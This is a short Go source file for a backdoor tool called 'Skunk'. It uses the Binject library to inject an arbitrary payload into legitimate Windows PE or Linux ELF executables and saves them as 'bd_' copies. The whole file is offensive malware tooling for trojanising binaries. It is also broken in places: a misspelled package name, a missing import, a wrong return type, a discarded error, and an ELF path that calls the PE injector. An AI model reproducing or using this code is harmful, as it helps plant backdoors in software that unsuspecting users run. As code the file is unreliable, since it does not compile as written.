package main

import (
  "fmt"
  "io/ioutil"
  "github.com/Binject/binjection/bj"
)
type Skunk struct{}

func (s *Skunk) BD(targetFile,bdFile string)error{
  var err error
  //find a way to check for file type
  trgData,err  := iotuil.ReadFile(targetFile)
  if err != nil{
    return fmt.Errorf("Error reading legitimate file: %v",err)
  }
  payload,err := ioutil.ReadFile(bdFile)
  if err != nil {
    fmt.Errorf("Error reading payload file: %v",err)
  }
  ft := FileChecker(targetFile)
  switch ft {
    case 0:
      err = ft.BDPE(targetFile,trgData,payload)
      if err != nil{ return err }
    case 1:
      err = ft.BDELF(targetFile,trgData,payload)
      if err != nil { return err }
    default:
      return fmt.Errorf("Unsurported file format.")
  }
  return nil
}

func BDSkunk()error{
  return new(Skunk)
}

var FileChecker = func(name string)FileTypes{
  var ft FileTypes
  return ft
}

type FileTypes int

const (
  EXE FileTypes = iota
  ELF
  PDF
  PNG
  JPEG
  JPG
  APK
  DLL
  SO
)

func (ft *FileTypes) BDPE(name string,initial,payload []byte)error{
  data,err := bj.PEBinject(initial,payload,&bj.BinjectConfig{
    InjectionMethod:bj.PE,
  })
  if err != nil{
    return fmt.Errorf("Error injecting into pe: %v",err)
  }
  err = os.WriteFile("../temp/"+"bd_"+name,data,0666)
  if err != nil{
    fmt.Println("%s",string(data))
    return fmt.Errorf("Error creating new backdoored file: %v",err)
  }
  return nil
}

func (ft *FileTypes) BDELF(name string,initial,payload []byte)error{
  data,err := bj.PEBinject(initial,payload,&bj.BinjectConfig{
    InjectionMethod:bj.ELF,
  })
  if err != nil{
    return fmt.Errorf("Error injecting into elf: %v",err)
  }
  err = os.WriteFile("../temp/"+"bd_"+name,data,0666)
  if err != nil{
    fmt.Println("%s",string(data))
    return fmt.Errorf("Error creating new backdoored file: %v",err)
  }
  return nil
}
